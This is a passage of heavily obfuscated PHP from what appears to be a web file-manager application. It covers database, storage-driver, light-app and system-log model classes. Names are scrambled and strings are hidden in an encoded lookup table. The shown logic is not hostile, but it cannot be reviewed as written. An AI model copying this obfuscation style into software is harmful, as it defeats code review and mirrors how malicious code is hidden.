$this->query($¯Ÿ©ˆè); $¡šµù˜ê = array(); foreach ($Ûˆ£™ıâ as $ˆÉ¸Ô•• => $ÀÙòû¢) { $¡šµù˜ê[$ˆÉ¸Ô••] = current($ÀÙòû¢); } return $¡šµù˜ê; } protected function parseLimit($¶„ÅŸâÈ) { $Ì»´¾î =& $_SERVER[¤·²È‰º]; $Ğ¡™ûÖ = $Ì»´¾î[12]; if (!empty($¶„ÅŸâÈ)) { switch ($this->dbType) { case $Ì»´¾î[938]: case $Ì»´¾î[930]: $¶„ÅŸâÈ = explode($Ì»´¾î[60], $¶„ÅŸâÈ); if (count($¶„ÅŸâÈ) > 1) { $Ğ¡™ûÖ .= $Ì»´¾î[61] . $¶„ÅŸâÈ[1] . $Ì»´¾î[62] . $¶„ÅŸâÈ[0] . $Ì»´¾î[63]; } else { $Ğ¡™ûÖ .= $Ì»´¾î[61] . $¶„ÅŸâÈ[0] . $Ì»´¾î[63]; } break; case $Ì»´¾î[911]: case $Ì»´¾î[929]: break; case $Ì»´¾î[913]: break; case $Ì»´¾î[912]: case $Ì»´¾î[914]: break; case $Ì»´¾î[941]: default: $Ğ¡™ûÖ .= $Ì»´¾î[61] . $¶„ÅŸâÈ . $Ì»´¾î[63]; } } return $Ğ¡™ûÖ; } public function parseKey(&$À·¿Í½İ, $¶€‡®ùÊ = true) { $ˆõİÌñ€ =& $_SERVER[¤·²È‰º]; if ($¶€‡®ùÊ) { $À·¿Í½İ = $this->parseKeyCheck($À·¿Í½İ); } if ($this->dbType == $ˆõİÌñ€[941]) { if ($À·¿Í½İ != $ˆõİÌñ€[198] && !preg_match($ˆõİÌñ€[905], $À·¿Í½İ)) { $À·¿Í½İ = $ˆõİÌñ€[393] . trim($À·¿Í½İ, $ˆõİÌñ€[393]) . $ˆõİÌñ€[393]; } return $À·¿Í½İ; } else { return parent::parseKey($À·¿Í½İ, $¶€‡®ùÊ); } } public function close() { $this->_linkID = null; } public function error() { $îûÓï²ç =& $_SERVER[¤·²È‰º]; if ($this->PDOStatement) { $ã´Ù‡ŸÎ = $this->PDOStatement->errorInfo(); $this->error = $ã´Ù‡ŸÎ[1] . $îûÓï²ç[4] . $ã´Ù‡ŸÎ[2]; } else { $this->error = $îûÓï²ç[12]; } if ($îûÓï²ç[12] != $this->queryStr) { $this->error .= LNG($îûÓï²ç[58]) . $this->queryStr; } think_trace($this->error, $îûÓï²ç[12], $îûÓï²ç[59]); return $this->error; } public function escapeString($¬¤Õ¯ì©) { $ú’Îöº‹ =& $_SERVER[¤·²È‰º]; switch ($this->dbType) { case $ú’Îöº‹[938]: case $ú’Îöº‹[911]: case $ú’Îöº‹[929]: case $ú’Îöº‹[941]: return addslashes($¬¤Õ¯ì©); case $ú’Îöº‹[913]: case $ú’Îöº‹[930]: case $ú’Îöº‹[912]: case $ú’Îöº‹[914]: return str_ireplace($ú’Îöº‹[68], $ú’Îöº‹[69], $¬¤Õ¯ì©); } } protected function parseValue($Öïüªö) { $Ú‘Û” » =& $_SERVER[¤·²È‰º]; if (is_string($Öïüªö)) { $¾Ê‹÷Ñ = strpos($Öïüªö, $Ú‘Û” »[4]) === 0 && in_array($Öïüªö, array_keys($this->bind)); $Öïüªö = $¾Ê‹÷Ñ ? $this->escapeString($Öïüªö) : $Ú‘Û” »[951] . $this->escapeString($Öïüªö) . $Ú‘Û” »[951]; } elseif (isset($Öïüªö[0]) && is_string($Öïüªö[0]) && strtolower($Öïüªö[0]) == $Ú‘Û” »[306]) { $Öïüªö = $this->escapeString($Öïüªö[1]); } elseif (is_array($Öïüªö)) { $Öïüªö = array_map(array($this, $Ú‘Û” »[952]), $Öïüªö); } elseif (is_bool($Öïüªö)) { $Öïüªö = $Öïüªö ? $Ú‘Û” »[98] : $Ú‘Û” »[207]; } elseif (is_null($Öïüªö)) { $Öïüªö = $Ú‘Û” »[113]; } return $Öïüªö; } public function getLastInsertId() { $ïÈƒ‚°è =& $_SERVER[¤·²È‰º]; switch ($this->dbType) { case $ïÈƒ‚°è[938]: case $ïÈƒ‚°è[930]: case $ïÈƒ‚°è[911]: case $ïÈƒ‚°è[929]: case $ïÈƒ‚°è[913]: case $ïÈƒ‚°è[941]: return $this->_linkID->lastInsertId(); case $ïÈƒ‚°è[912]: case $ïÈƒ‚°è[914]: $Ë¶ôÓŞè = $this->table; $¢ÈšõÂ€ = $this->query("\123\105\x4c\105\x43\x54\40{$Ë¶ôÓŞè}\56\x63\x75\162\162\166\141\x6c\x20\143\165\x72\x72\x76\141\x6c\40\106\122\117\115\40\144\x75\141\x6c"); return $¢ÈšõÂ€ ? $¢ÈšõÂ€[0][$ïÈƒ‚°è[953]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($†•ˆªÛ¶) { $ĞİÂÏÑˆ =& $_SERVER[¤·²È‰º]; if (!CacheLock::fileLock($ĞİÂÏÑˆ[23])) { return !1; } $º‹ş–Ü… = parent::query($†•ˆªÛ¶); CacheLock::fileUnLock($ĞİÂÏÑˆ[23]); return $º‹ş–Ü…; } public function execute($•Âúëìñ) { $ÊÃãßÀÀ =& $_SERVER[¤·²È‰º]; if (!CacheLock::fileLock($ÊÃãßÀÀ[23])) { return !1; } $ŒÊ®»º“ = parent::execute($•Âúëìñ); CacheLock::fileUnLock($ÊÃãßÀÀ[23]); return $ŒÊ®»º“; } } goto f¼™ë¦³İø; dŸÖé¸‚•Ğ: class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\56\x73\x74\x6f\x72\141\x67\x65\114\x69\163\164"; public $field = array("\156\x61\x6d\x65", "\163\x69\172\x65\x4d\x61\x78", "\x73\171\x73\164\145\155", "\x64\145\x66\141\x75\154\x74", "\x64\x72\x69\166\x65\x72", "\143\157\156\x66\151\147"); public function listData($”·å­‹í = false, $ÑûÃĞÒ™ = "\x6d\157\x64\x69\146\x79\124\151\x6d\x65", $—„ƒòü = false) { $Áïíô =& $_SERVER[¤·²È‰º]; $˜—›™• = parent::listData($”·å­‹í, $ÑûÃĞÒ™, $—„ƒòü); if ($”·å­‹í) { return $˜—›™•; } $î¦ÁğˆÚ = $this->ioSizeUseGet(array_to_keyvalue($˜—›™•, $Áïíô[12], $Áïíô[407])); foreach ($˜—›™• as $éê¼Êè => $ñ•˜Í) { unset($˜—›™•[$éê¼Êè][$Áïíô[6]]); $˜—›™•[$éê¼Êè][$Áïíô[1812]] = isset($î¦ÁğˆÚ[$ñ•˜Í[$Áïíô[407]]]) ? $î¦ÁğˆÚ[$ñ•˜Í[$Áïíô[407]]] : 0; } return $˜—›™•; } public function ioSizeUseGet($ÜÜèèüÑ) { $…ã¿¬âÚ =& $_SERVER[¤·²È‰º]; if (!$ÜÜèèüÑ) { return array(); } $­ô«–ÌÛ = $…ã¿¬âÚ[2138] . implode($…ã¿¬âÚ[60], $ÜÜèèüÑ); $•ƒ£ÁäÂ = Cache::get($­ô«–ÌÛ); if ($•ƒ£ÁäÂ) { return $•ƒ£ÁäÂ; } $œÙœğ˜ = array($…ã¿¬âÚ[818] => $…ã¿¬âÚ[407], $…ã¿¬âÚ[2139] => $…ã¿¬âÚ[86]); $’ŸÉºÄ = array($…ã¿¬âÚ[818] => array($…ã¿¬âÚ[7], $ÜÜèèüÑ)); $•ƒ£ÁäÂ = Model($…ã¿¬âÚ[790])->field($œÙœğ˜)->where($’ŸÉºÄ)->group($…ã¿¬âÚ[818])->select(); $•ƒ£ÁäÂ = array_to_keyvalue($•ƒ£ÁäÂ, $…ã¿¬âÚ[407], $…ã¿¬âÚ[86]); Cache::set($­ô«–ÌÛ, $•ƒ£ÁäÂ, 600); return $•ƒ£ÁäÂ; } public function getConfig($ÌÜ£€) { $Øëç¹ï© = parent::listData($ÌÜ£€); return json_decode($Øëç¹ï©[$_SERVER[¤·²È‰º][6]], !0); } public function update($«¦„¼ªÓ, $Ä‚Æ¸Ñæ) { $°²¢Ç œ =& $_SERVER[¤·²È‰º]; $ç¢ùª¯Æ = $Ä‚Æ¸Ñæ[$°²¢Ç œ[42]]; $´×‚Ùëï = array_to_keyvalue(parent::listData(), $°²¢Ç œ[42]); if (isset($´×‚Ùëï[$ç¢ùª¯Æ]) && $´×‚Ùëï[$ç¢ùª¯Æ][$°²¢Ç œ[407]] != $«¦„¼ªÓ) { return !1; } if (!empty($Ä‚Æ¸Ñæ[$°²¢Ç œ[6]])) { $±æ˜»µè = json_decode($Ä‚Æ¸Ñæ[$°²¢Ç œ[6]], !0); $ÊõıŞ»™ = isset($±æ˜»µè[$°²¢Ç œ[2140]]) ? $°²¢Ç œ[2140] : (isset($±æ˜»µè[$°²¢Ç œ[2141]]) ? $°²¢Ç œ[2141] : $°²¢Ç œ[12]); if ($ÊõıŞ»™) { $ŞÛè†¢Ÿ = $this->getConfig($«¦„¼ªÓ); $ù—ùšé€ = $ŞÛè†¢Ÿ[$ÊõıŞ»™]; $Â£É˜ªİ = $±æ˜»µè[$ÊõıŞ»™]; if ($Â£É˜ªİ == str_repeat($°²¢Ç œ[198], strlen($ù—ùšé€))) { $±æ˜»µè[$ÊõıŞ»™] = $ù—ùšé€; } else { if ($Â£É˜ªİ != $ù—ùšé€) { $Ä‚Æ¸Ñæ[$°²¢Ç œ[2142]] = $°²¢Ç œ[98]; } } } } if (isset($Ä‚Æ¸Ñæ[$°²¢Ç œ[2142]]) && $Ä‚Æ¸Ñæ[$°²¢Ç œ[2142]] == $°²¢Ç œ[98]) { $this->checkConfig($Ä‚Æ¸Ñæ); } unset($Ä‚Æ¸Ñæ[$°²¢Ç œ[2142]]); $ÊŞ£İ« = parent::update($«¦„¼ªÓ, $Ä‚Æ¸Ñæ); if ($ÊŞ£İ« && $Ä‚Æ¸Ñæ[$°²¢Ç œ[47]]) { $ì¢şÏÙ = 0; foreach ($´×‚Ùëï as $§æ‘ØÔÄ) { if ($§æ‘ØÔÄ[$°²¢Ç œ[47]] && $§æ‘ØÔÄ[$°²¢Ç œ[407]] != $«¦„¼ªÓ) { $ì¢şÏÙ = $§æ‘ØÔÄ[$°²¢Ç œ[407]]; parent::update($§æ‘ØÔÄ[$°²¢Ç œ[407]], array($°²¢Ç œ[47] => 0)); } } $this->updateBackup($«¦„¼ªÓ, $ì¢şÏÙ); } return $ÊŞ£İ«; } public function add($•ÂÈèÄ²) { $úÙà©éÚ =& $_SERVER[¤·²È‰º]; $ÕâÁÀê‚ = array_to_keyvalue(parent::listData(), $úÙà©éÚ[42]); if (isset($ÕâÁÀê‚[$•ÂÈèÄ²[$úÙà©éÚ[42]]])) { return !1; } $this->checkConfig($•ÂÈèÄ²); $ªéª»Ï = parent::insert($•ÂÈèÄ²); if ($ªéª»Ï && $•ÂÈèÄ²[$úÙà©éÚ[47]]) { foreach ($ÕâÁÀê‚ as $ˆÔã•Ò) { if ($ˆÔã•Ò[$úÙà©éÚ[47]]) { parent::update($ˆÔã•Ò[$úÙà©éÚ[407]], array($úÙà©éÚ[47] => 0)); } } } return $ªéª»Ï; } public function updateBackup($ù¡¦ï¡À, $éë›©ï÷) { $ª¬ù›» =& $_SERVER[¤·²È‰º]; if (!$éë›©ï÷) { return; } $ùï†¦¶¿ = Model($ª¬ù›»[750])->config(); if ($ùï†¦¶¿[$ª¬ù›»[1621]] != $ª¬ù›»[98] || $ùï†¦¶¿[$ª¬ù›»[753]] != $éë›©ï÷) { return; } $—ÏÍ¤Â = Model($ª¬ù›»[771])->get($ª¬ù›»[781]); $—ÏÍ¤Â = json_decode($—ÏÍ¤Â, !0); if (!$—ÏÍ¤Â) { return; } $—ÏÍ¤Â[$ª¬ù›»[753]] = $ù¡¦ï¡À; Model($ª¬ù›»[771])->set(array($ª¬ù›»[781] => $—ÏÍ¤Â)); } public function checkConfig(&$Û¥¸­€ô, $ö˜ìÏ¤˜ = false) { $‚Ã©àŒé =& $_SERVER[¤·²È‰º]; $éŸËÆÇ = strtolower($Û¥¸­€ô[$‚Ã©àŒé[105]]); $™ñªâÈÎ = json_decode($Û¥¸­€ô[$‚Ã©àŒé[6]], !0); foreach ($™ñªâÈÎ as $«şŞ Ù» => $®¿òàıÎ) { $™ñªâÈÎ[$«şŞ Ù»] = trim($®¿òàıÎ); } $™ñªâÈÎ[$‚Ã©àŒé[2143]] = rand_string(6); $İıˆ¯ùĞ = $GLOBALS[$‚Ã©àŒé[6]][$‚Ã©àŒé[99]][$‚Ã©àŒé[827]]; $®ÓŒ÷ˆ´ = isset($İıˆ¯ùĞ[$éŸËÆÇ]) ? $İıˆ¯ùĞ[$éŸËÆÇ] : ucfirst($éŸËÆÇ); $¬èöÊ¿ = $‚Ã©àŒé[84] . $®ÓŒ÷ˆ´; if (!$®ÓŒ÷ˆ´ || !class_exists($¬èöÊ¿)) { if ($ö˜ìÏ¤˜) { return LNG($‚Ã©àŒé[2144]); } write_log(array($‚Ã©àŒé[2145], $Û¥¸­€ô, get_caller_info()), $‚Ã©àŒé[2146]); show_json(LNG($‚Ã©àŒé[2144]), !1, $Û¥¸­€ô); } $Õ›…Äş‡ = new $¬èöÊ¿($™ñªâÈÎ); if (in_array($éŸËÆÇ, $Õ›…Äş‡->objectDriver)) { if (!$Õ›…Äş‡->isBucketCors() && !$Õ›…Äş‡->setBucketCors()) { $¸¨‘ñ´ç = LNG($‚Ã©àŒé[2147]); $¸¨‘ñ´ç .= $‚Ã©àŒé[2148] . LNG($‚Ã©àŒé[2149]); if ($ö˜ìÏ¤˜) { return $¸¨‘ñ´ç; } show_json($¸¨‘ñ´ç, !1); } } $äï›½ï“ = rtrim($™ñªâÈÎ[$‚Ã©àŒé[1175]], $‚Ã©àŒé[8]) . $‚Ã©àŒé[8]; $¶ïà´Ôí = $Õ›…Äş‡->getPath($äï›½ï“ . $‚Ã©àŒé[1237]); if (!$Õ›…Äş‡->mkfile($¶ïà´Ôí)) { if ($ö˜ìÏ¤˜) { return LNG($‚Ã©àŒé[2147]); } show_json(LNG($‚Ã©àŒé[2147]), !1); } $™ñªâÈÎ[$‚Ã©àŒé[1175]] = $äï›½ï“; $Û¥¸­€ô[$‚Ã©àŒé[6]] = json_encode($™ñªâÈÎ); $Û¥¸­€ô[$‚Ã©àŒé[105]] = $®ÓŒ÷ˆ´; return !0; } public function driverListSystem() { $ø§ª´üÌ =& $_SERVER[¤·²È‰º]; $¿«úõÁ” = parent::listData(); $üØ ‘Ë¾ = array(); foreach ($¿«úõÁ” as $œœö‘Í) { unset($œœö‘Í[$ø§ª´üÌ[210]], $œœö‘Í[$ø§ª´üÌ[95]]); $œœö‘Í[$ø§ª´üÌ[6]] = json_decode($œœö‘Í[$ø§ª´üÌ[6]], !0); $üØ ‘Ë¾[] = $œœö‘Í; } return $üØ ‘Ë¾; } public function defaultDriver() { $¨×²äšó =& $_SERVER[¤·²È‰º]; $îı„ûïÛ = parent::listData(); $íœ«´Ï = array_filter_by_field($îı„ûïÛ, $¨×²äšó[47], 1); $íœ«´Ï = $íœ«´Ï[0]; if ($íœ«´Ï) { $íœ«´Ï[$¨×²äšó[6]] = json_decode($íœ«´Ï[$¨×²äšó[6]], !0); } return $íœ«´Ï; } public function driverInfo($ºø„®ø) { $šúÁšæÀ =& $_SERVER[¤·²È‰º]; $ûøñ†Î = array_to_keyvalue(parent::listData(), $šúÁšæÀ[407]); if (!isset($ûøñ†Î[$ºø„®ø])) { return !1; } $ß„ø”İ¤ = $ûøñ†Î[$ºø„®ø]; $ß„ø”İ¤[$šúÁšæÀ[6]] = json_decode($ß„ø”İ¤[$šúÁšæÀ[6]], !0); return $ß„ø”İ¤; } public function remove($“ËÀÚ â) { $this->removeShareItems($“ËÀÚ â); return parent::remove($“ËÀÚ â); } public function removeWithFile($û‹‡İÔ, $Í‹Ì”Äß) { $£ÃúÁµó =& $_SERVER[¤·²È‰º]; $À¨µô¼Æ = array($£ÃúÁµó[818] => $û‹‡İÔ); $™Ê¢ü’í = Model($£ÃúÁµó[479])->where($À¨µô¼Æ)->count(); $×ÛÌàçç = Model($£ÃúÁµó[479])->where($À¨µô¼Æ)->sum($£ÃúÁµó[86]); $˜³±…« = $Í‹Ì”Äß . $£ÃúÁµó[2150] . $û‹‡İÔ; $¯…¢Òş = LNG($Í‹Ì”Äß == $£ÃúÁµó[565] ? $£ÃúÁµó[2151] : $£ÃúÁµó[2152]); $Û¹É¦ô = new TaskFileTransfer($˜³±…«, $£ÃúÁµó[2146], $™Ê¢ü’í, $¯…¢Òş . "\x28{$û‹‡İÔ}\x29"); $Û¹É¦ô->task[$£ÃúÁµó[764]] = (double) $×ÛÌàçç; $ûÑÊ±· = KodIO::defaultDriver(); $Ğı¹“ê = $ûÑÊ±·[$£ÃúÁµó[407]]; $ìŠŞª˜Ë = "\173\x69\x6f\72{$Ğı¹“ê}\175\x2f"; $çä¿®É­ = !0; $È”Öè— = array(); $÷‚Í Ÿ¨ = Model($£ÃúÁµó[209])->where($À¨µô¼Æ)->field($£ÃúÁµó[2153])->select(); foreach ($÷‚Í Ÿ¨ as $ÒÚÂöš) { $óÕÖ£ì¡ = $ÒÚÂöš[$£ÃúÁµó[94]]; $ÓŠ”Ï½º = $ìŠŞª˜Ë . str_replace("\x7b\x69\157\x3a{$û‹‡İÔ}\175\57", $£ÃúÁµó[12], $óÕÖ£ì¡); if (!IO::exist($óÕÖ£ì¡)) { $È”Öè—[] = $ÒÚÂöš[$£ÃúÁµó[476]]; $Û¹É¦ô->updateFileEnd($ÒÚÂöš[$£ÃúÁµó[42]], $ÒÚÂöš[$£ÃúÁµó[86]]); continue; } if (IO::exist($ÓŠ”Ï½º)) { $Û¹É¦ô->updateFileEnd($ÒÚÂöš[$£ÃúÁµó[42]], $ÒÚÂöš[$£ÃúÁµó[86]]); continue; } if (!IO::move($óÕÖ£ì¡, get_path_father($ÓŠ”Ï½º))) { $çä¿®É­ = !1; break; } $À¨µô¼Æ = array($£ÃúÁµó[476] => $ÒÚÂöš[$£ÃúÁµó[476]]); $á®¼…à· = array($£ÃúÁµó[818] => $Ğı¹“ê, $£ÃúÁµó[94] => $ÓŠ”Ï½º); Model($£ÃúÁµó[209])->where($À¨µô¼Æ)->save($á®¼…à·); } $this->removeByFileID($È”Öè—); if (!$çä¿®É­) { $Û¹É¦ô->stop($˜³±…«); return !1; } $Û¹É¦ô->end(); if ($Í‹Ì”Äß == $£ÃúÁµó[1792]) { $this->remove($û‹‡İÔ); } } public function progress($ï—ŸÜ‡û, $ˆ ¶ãúÈ) { return Task::get($ˆ ¶ãúÈ . $_SERVER[¤·²È‰º][2150] . $ï—ŸÜ‡û); } private function removeByFileID($ñÜ€ÔĞ‚ = array()) { $¾ÛéŠ†Ä =& $_SERVER[¤·²È‰º]; if (empty($ñÜ€ÔĞ‚)) { return; } $“ÛõµŠí = array($¾ÛéŠ†Ä[476] => array($¾ÛéŠ†Ä[7], $ñÜ€ÔĞ‚)); $¿€íö¨Â = Model($¾ÛéŠ†Ä[1321])->where($“ÛõµŠí)->field($¾ÛéŠ†Ä[410])->select(); if (!$¿€íö¨Â) { return; } $¿€íö¨Â = array_to_keyvalue($¿€íö¨Â, $¾ÛéŠ†Ä[12], $¾ÛéŠ†Ä[410]); foreach ($¿€íö¨Â as $£ë¤¨ÀÛ) { Model($¾ÛéŠ†Ä[424])->removeNow($£ë¤¨ÀÛ, !1); } } private function removeShareItems($§ Ğº) { $ŞùŸõ©Á =& $_SERVER[¤·²È‰º]; $¿ˆş°Ò¼ = "\173\151\x6f\x3a{$§ Ğº}\175\57"; $Ùè½áî¯ = array($ŞùŸõ©Á[410] => 0, $ŞùŸõ©Á[1170] => array($ŞùŸõ©Á[391], "{$¿ˆş°Ò¼}\45")); $¤óİ‰ÖÚ = Model($ŞùŸõ©Á[1803])->where($Ùè½áî¯)->field($ŞùŸõ©Á[497])->select(); if (empty($¤óİ‰ÖÚ)) { return; } $ÔŸ…ÌŞÂ = array_to_keyvalue($¤óİ‰ÖÚ, $ŞùŸõ©Á[12], $ŞùŸõ©Á[497]); Model($ŞùŸõ©Á[609])->remove($ÔŸ…ÌŞÂ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\x2e\x4c\151\x67\150\x74\101\x70\160"; public $modelType = "\x53\171\x73\x74\x65\155\117\x70\164\x69\x6f\x6e"; public $field = array("\156\141\155\x65", "\x67\162\157\165\160", "\144\x65\163\x63", "\x63\157\156\164\145\x6e\164"); public function listData($÷±ŠÛæ = false, $İ±ùÀÏæ = "\155\x6f\144\151\146\x79\x54\151\155\145", $Ü¯Í«ú = true) { return parent::listData($÷±ŠÛæ, $İ±ùÀÏæ, $Ü¯Í«ú); } public function remove($´ÈÀ‚ÕÚ) { $—Ôù‚ë = $this->findByName($´ÈÀ‚ÕÚ); if (!$—Ôù‚ë) { return !1; } return parent::remove($—Ôù‚ë[$_SERVER[¤·²È‰º][407]]); } public function add($†¡úáòÙ) { if ($this->findByName($†¡úáòÙ[$_SERVER[¤·²È‰º][42]])) { return !1; } return parent::insert($†¡úáòÙ); } public function update($Ë«ÅÊ·, $ÌÕ«´ıÒ) { $×”ì“œó =& $_SERVER[¤·²È‰º]; $ÉÚˆº§Æ = $this->findByName($Ë«ÅÊ·); $’¸ÔàÔŒ = $this->findByName($ÌÕ«´ıÒ[$×”ì“œó[42]]); if (!$ÉÚˆº§Æ || $’¸ÔàÔŒ && $’¸ÔàÔŒ[$×”ì“œó[407]] != $ÉÚˆº§Æ[$×”ì“œó[407]]) { return !1; } return parent::update($ÉÚˆº§Æ[$×”ì“œó[407]], $ÌÕ«´ıÒ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\164\145\155\137\154\157\x67"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\x54\151\155\145", "\164\x69\x6d\x65", "\x69\156\163\x65\x72\x74", "\x66\165\x6e\143\x74\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $«ÂÕŞäÙ =& $_SERVER[¤·²È‰º]; return array($«ÂÕŞäÙ[2154] => LNG($«ÂÕŞäÙ[2155]), $«ÂÕŞäÙ[2156] => LNG($«ÂÕŞäÙ[2157]), $«ÂÕŞäÙ[1766] => LNG($«ÂÕŞäÙ[2158]), $«ÂÕŞäÙ[2159] => LNG($«ÂÕŞäÙ[2160]), $«ÂÕŞäÙ[2161] => LNG($«ÂÕŞäÙ[2162]), $«ÂÕŞäÙ[2163] => LNG($«ÂÕŞäÙ[2164]), $«ÂÕŞäÙ[2165] => LNG($«ÂÕŞäÙ[2166]), $«ÂÕŞäÙ[1796] => LNG($«ÂÕŞäÙ[2166]), $«ÂÕŞäÙ[1797] => LNG($«ÂÕŞäÙ[2167]), $«ÂÕŞäÙ[2168] => LNG($«ÂÕŞäÙ[2169]), $«ÂÕŞäÙ[2170] => LNG($«ÂÕŞäÙ[2171]), $«ÂÕŞäÙ[2172] => LNG($«ÂÕŞäÙ[2173]), $«ÂÕŞäÙ[2174] => LNG($«ÂÕŞäÙ[2175]), $«ÂÕŞäÙ[1794] => LNG($«ÂÕŞäÙ[2176]), $«ÂÕŞäÙ[2177] => LNG($«ÂÕŞäÙ[2178]), $«ÂÕŞäÙ[1801] => LNG($«ÂÕŞäÙ[2179]), $«ÂÕŞäÙ[2180] => LNG($«ÂÕŞäÙ[2181]), $«ÂÕŞäÙ[2182] => LNG($«ÂÕŞäÙ[2183]), $«ÂÕŞäÙ[2184] => LNG($«ÂÕŞäÙ[2185]), $«ÂÕŞäÙ[2186] => LNG($«ÂÕŞäÙ[2187]), $«ÂÕŞäÙ[1804] => LNG($«ÂÕŞäÙ[2188]), $«ÂÕŞäÙ[1805] => LNG($«ÂÕŞäÙ[2189]), $«ÂÕŞäÙ[2190] => LNG($«ÂÕŞäÙ[2191]), $«ÂÕŞäÙ[2192] => LNG($«ÂÕŞäÙ[2193]), $«ÂÕŞäÙ[2194] => LNG($«ÂÕŞäÙ[2195]), $«ÂÕŞäÙ[1799] => LNG($«ÂÕŞäÙ[2196]), $«ÂÕŞäÙ[2197] => LNG($«ÂÕŞäÙ[2198]), $«ÂÕŞäÙ[1798] => LNG($«ÂÕŞäÙ[2199]), $«ÂÕŞäÙ[2200] => LNG($«ÂÕŞäÙ[2201]), $«ÂÕŞäÙ[2202] => LNG($«ÂÕŞäÙ[2203]), $«ÂÕŞäÙ[2204] => LNG($«ÂÕŞäÙ[2205]), $«ÂÕŞäÙ[2206] => LNG($«ÂÕŞäÙ[2206]), $«ÂÕŞäÙ[2207] => LNG($«ÂÕŞäÙ[1770]), $«ÂÕŞäÙ[2208] => LNG($«ÂÕŞäÙ[2209]), $«ÂÕŞäÙ[2210] => LNG($«ÂÕŞäÙ[2211]), $«ÂÕŞäÙ[2212] => LNG($«ÂÕŞäÙ[2213]), $«ÂÕŞäÙ[2214] => LNG($«ÂÕŞäÙ[2215]), $«ÂÕŞäÙ[2216] => LNG($«ÂÕŞäÙ[2217]), $«ÂÕŞäÙ[2218] => LNG($«ÂÕŞäÙ[2218]), $«ÂÕŞäÙ[2219] => LNG($«ÂÕŞäÙ[2220]), $«ÂÕŞäÙ[2221] => LNG($«ÂÕŞäÙ[2222]), $«ÂÕŞäÙ[2223] => LNG($«ÂÕŞäÙ[2224]), $«ÂÕŞäÙ[2225] => LNG($«ÂÕŞäÙ[2226]), $«ÂÕŞäÙ[2227] => LNG($«ÂÕŞäÙ[2228]), $«ÂÕŞäÙ[2229] => LNG($«ÂÕŞäÙ[2230])); } private function typeFile() { $‰ºÉ–õ =& $_SERVER[¤·²È‰º]; $âõ¦‘ãŞ = array($‰ºÉ–õ[1801] => array($‰ºÉ–õ[1802]), $‰ºÉ–õ[2172] => array($‰ºÉ–õ[2231]), $‰ºÉ–õ[2174] => array($‰ºÉ–õ[2232]), $‰ºÉ–õ[1794] => array($‰ºÉ–õ[1795]), $‰ºÉ–õ[2182] => array(), $‰ºÉ–õ[2184] => array(), $‰ºÉ–õ[2186] => array(), $‰ºÉ–õ[1804] => array($‰ºÉ–õ[1806]), $‰ºÉ–õ[1805] => array($‰ºÉ–õ[1806]), $‰ºÉ–õ[2190] => array($‰ºÉ–õ[2233]), $‰ºÉ–õ[2192] => array($‰ºÉ–õ[2233]), $‰ºÉ–õ[2194] => array($‰ºÉ–õ[2234]), $‰ºÉ–õ[2180] => array($‰ºÉ–õ[2235]), $‰ºÉ–õ[1799] => array($‰ºÉ–õ[2236]), $‰ºÉ–õ[2197] => array($‰ºÉ–õ[2237]), $‰ºÉ–õ[1798] => array($‰ºÉ–õ[1800])); return $âõ¦‘ãŞ; } private function typeAll() { $’ô«„Ú¢ =& $_SERVER[¤·²È‰º]; $ÂÀÏÆ„™ = $this->typeList; $ÑûÎ¡ÄÓ = array_filter($this->typeFile()); foreach ($ÑûÎ¡ÄÓ as $¬é›­à => $õÑ¸ ï) { $ÂÀÏÆ„™[$õÑ¸ ï[0]] = $ÂÀÏÆ„™[$¬é›­à]; } $ÂÀÏÆ„™[$’ô«„Ú¢[1806]] = LNG($’ô«„Ú¢[2238]); $ÂÀÏÆ„™[$’ô«„Ú¢[2233]] = LNG($’ô«„Ú¢[2239]); return $ÂÀÏÆ„™; } public function addLog($÷“›¦…˜, $‰ÅÇ¤ù„ = array()) { $šëìñÃ =& $_SERVER[¤·²È‰º]; if (!isset($this->typeList[$÷“›¦…˜])) { return; } $Â’İËÜ÷ = defined($šëìñÃ[483]) && USER_ID ? USER_ID : (isset($‰ÅÇ¤ù„[$šëìñÃ[1651]]) ? $‰ÅÇ¤ù„[$šëìñÃ[1651]] : 0); if (!$Â’İËÜ÷) { $Â’İËÜ÷ = (int) Session::get($šëìñÃ[1960]); } if ($÷“›¦…˜ == $šëìñÃ[2208] && is_array($‰ÅÇ¤ù„[$šëìñÃ[2240]]) && !$‰ÅÇ¤ù„[$šëìñÃ[2240]]) { return; } $Ğ°çûÌå = get_client_ip(); if (!$‰ÅÇ¤ù„ || strlen(json_encode($‰ÅÇ¤ù„)) >= 1024) { $‰ÅÇ¤ù„ = array($šëìñÃ[2241] => $Ğ°çûÌå); } else { if (is_array($‰ÅÇ¤ù„)) { $‰ÅÇ¤ù„[$šëìñÃ[2241]] = $Ğ°çûÌå; } else { $‰ÅÇ¤ù„ = array($šëìñÃ[1187] => $‰ÅÇ¤ù„, $šëìñÃ[2241] => $Ğ°çûÌå); } } $‰ÅÇ¤ù„ = array($šëìñÃ[1641] => Session::sign(), $šëìñÃ[1642] => $Â’İËÜ÷, $šëìñÃ[43] => $÷“›¦…˜, $šëìñÃ[1644] => json_encode($‰ÅÇ¤ù„)); parent::add($‰ÅÇ¤ù„); } public function remove($àòóî«Á) { $this->where(array($_SERVER[¤·²È‰º][427] => $àòóî«Á))->delete(); } private function _makeOrder($èÃ›õúÛ = '') { $“É§™¥½ =& $_SERVER[¤·²È‰º]; $ÉŞ¾®Æ¥ = $“É§™¥½[210]; $”»“€ë¬ = array($“É§™¥½[458] => $“É§™¥½[459], $“É§™¥½[460] => $“É§™¥½[461]); $™È°¡¢ = Input::get($“É§™¥½[466], $“É§™¥½[7], $“É§™¥½[1992], array($“É§™¥½[1914], $“É§™¥½[460])); $™È°¡¢ = $”»“€ë¬[$™È°¡¢]; $èÃ›õúÛ = $èÃ›õúÛ . "{$ÉŞ¾®Æ¥}\40{$™È°¡¢}"; return $this->order($èÃ›õúÛ); } public function get($Ù§¾ş‘ = '') { $äñ˜Á» =& $_SERVER[¤·²È‰º]; if (!$Ù§¾ş‘) { show_json(array()); } $çÇŞõ¹ = array(); if ($Ù§¾ş‘[$äñ˜Á»[1651]]) { $çÇŞõ¹[$äñ˜Á»[1651]] = $Ù§¾ş‘[$äñ˜Á»[1651]]; } if (isset($Ù§¾ş‘[$äñ˜Á»[762]])) { 